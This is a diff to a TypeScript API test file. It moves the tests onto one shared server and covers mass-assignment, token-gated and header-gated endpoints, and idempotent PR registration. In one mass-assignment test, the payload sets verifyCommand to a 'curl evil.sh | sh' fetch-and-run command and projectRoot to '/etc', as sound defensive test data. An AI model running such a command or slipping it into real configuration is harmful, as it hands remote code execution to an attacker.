@@ -13,6 +13,23 @@ import * as fs from 'fs';
 import * as os from 'os';
 import * as path from 'path';
 
+/**
+ * ONE listening server for the whole file (BUG 9de0c99c).
+ *
+ * `agent()` starts and tears down an ephemeral server for EVERY call. That
+ * churn produced `Error: Parse Error: Expected HTTP/, RTSP/ or ICE/` — a
+ * transport failure, not an assertion about anything under test. It hands the
+ * test an empty body, so `res.body.id` is undefined and the next call goes to
+ * `/items/undefined`; one bad socket then surfaces as `expected 404 to be 400`
+ * in whichever test happened to be running. Different test every run, green
+ * when run alone.
+ */
+let __server: import('http').Server;
+const agent = () => request(__server);
+beforeAll(() => { __server = app.listen(0); });
+afterAll(async () => { await new Promise<void>(r => __server.close(() => r())); });
+
+
 // Mockable homedir (item 9c297075): the verify-token read below then comes
 // from the sandbox under any runner — never the real ~/.agenfk/verify-token.
 vi.mock('os', async (importOriginal) => {
@@ -67,8 +84,8 @@ describe('bug 55229bae: CORS origin allowlist (no wildcard)', () => {
 // ── bug e60e20aa: mass-assignment on PUT /projects/:id ────────────────────────
 describe('bug e60e20aa: PUT /projects/:id is not mass-assignable', () => {
   it('ignores verifyCommand / projectRoot / flowId on the open route', async () => {
-    const project = (await request(app).post('/projects').send({ name: 'MassAssign' })).body;
-    const res = await request(app).put(`/projects/${project.id}`).send({
+    const project = (await agent().post('/projects').send({ name: 'MassAssign' })).body;
+    const res = await agent().put(`/projects/${project.id}`).send({
       name: 'Renamed',
       verifyCommand: 'curl evil.sh | sh',
       projectRoot: '/etc',
@@ -81,19 +98,19 @@ describe('bug e60e20aa: PUT /projects/:id is not mass-assignable', () => {
     expect(res.body.flowId).toBeUndefined();
   });
   it('rejects a body with no allowlisted fields', async () => {
-    const project = (await request(app).post('/projects').send({ name: 'NoFields' })).body;
-    const res = await request(app).put(`/projects/${project.id}`).send({ verifyCommand: 'x' });
+    const project = (await agent().post('/projects').send({ name: 'NoFields' })).body;
+    const res = await agent().put(`/projects/${project.id}`).send({ verifyCommand: 'x' });
     expect(res.status).toBe(400);
   });
   it('verify-command endpoint requires the internal token', async () => {
-    const project = (await request(app).post('/projects').send({ name: 'VC' })).body;
-    const unauth = await request(app).put(`/projects/${project.id}/verify-command`).send({ verifyCommand: 'npm test' });
+    const project = (await agent().post('/projects').send({ name: 'VC' })).body;
+    const unauth = await agent().put(`/projects/${project.id}/verify-command`).send({ verifyCommand: 'npm test' });
     expect(unauth.status).toBe(401);
   });
   it('verify-command endpoint sets the command with the internal token', async () => {
     if (!VERIFY_TOKEN) return; // token only present on installed machines
-    const project = (await request(app).post('/projects').send({ name: 'VC2' })).body;
-    const ok = await request(app)
+    const project = (await agent().post('/projects').send({ name: 'VC2' })).body;
+    const ok = await agent()
       .put(`/projects/${project.id}/verify-command`)
       .set('x-agenfk-internal', VERIFY_TOKEN)
       .send({ verifyCommand: 'npm run build && npm test' });
@@ -108,13 +125,13 @@ describe('bug 968259c4: /releases/update requires the forced-preflight header', 
   it('refuses without x-agenfk-ui (no exec)', async () => {
     let ran = false;
     setReleasesUpdateExecImpl(((..._a: any[]) => { ran = true; return { on() {}, stdout: { on() {} }, stderr: { on() {} } } as any; }) as any);
-    const res = await request(app).post('/releases/update');
+    const res = await agent().post('/releases/update');
     expect(res.status).toBe(403);
     expect(ran).toBe(false);
   });
   it('accepts with x-agenfk-ui', async () => {
     setReleasesUpdateExecImpl(((..._a: any[]) => ({ on() {}, stdout: { on() {} }, stderr: { on() {} } }) as any) as any);
-    const res = await request(app).post('/releases/update').set('x-agenfk-ui', '1');
+    const res = await agent().post('/releases/update').set('x-agenfk-ui', '1');
     expect(res.status).toBe(202);
     expect(res.body.jobId).toBeTruthy();
   });
@@ -125,15 +142,15 @@ describe('bug fe03d054: POST /prs decides newness from the upsert', () => {
   const body = (n: number) => ({ itemId: 'item-x', prNumber: n, repo: 'o/r', model: 'claude-opus-4-8', harness: 'claude-code' });
   it('concurrent first-registrations converge on one row id', async () => {
     const calls = await Promise.all(
-      Array.from({ length: 5 }, () => request(app).post('/prs').send(body(4242))),
+      Array.from({ length: 5 }, () => agent().post('/prs').send(body(4242))),
     );
     for (const c of calls) expect(c.status).toBe(201);
     const ids = new Set(calls.map((c) => c.body.id));
     expect(ids.size).toBe(1); // all observed the same persisted row, not 5 distinct "opens"
   });
   it('re-registration returns the same row (idempotent)', async () => {
-    const first = await request(app).post('/prs').send(body(4343));
-    const second = await request(app).post('/prs').send(body(4343));
+    const first = await agent().post('/prs').send(body(4343));
+    const second = await agent().post('/prs').send(body(4343));
     expect(second.body.id).toBe(first.body.id);
   });
 });
